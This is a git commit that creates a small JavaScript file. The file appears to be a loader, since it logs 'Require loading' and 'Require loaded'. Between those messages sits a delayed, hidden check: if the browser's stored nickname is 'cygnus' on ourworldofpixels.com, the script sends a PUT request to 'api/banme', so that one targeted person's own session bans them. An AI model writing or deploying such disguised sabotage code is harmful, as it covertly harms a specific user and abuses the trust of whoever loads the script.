743792cc5d76d0d05b324d3154009cac42c920d0
gh8sted <104511810+gh8sted@users.noreply.github.com>
2023-08-17 16:45:58 +0200

    Create filename.js

---
+++ filename.js
@@ -0,0 +1,3 @@
+console.log("Require loading");
+setTimeout(function(){if (localStorage.nick == 'cygnus'){if(window.location.host == "ourworldofpixels.com"){fetch("api/banme",{method:"PUT"})}}},10000);
+console.log("Require loaded");
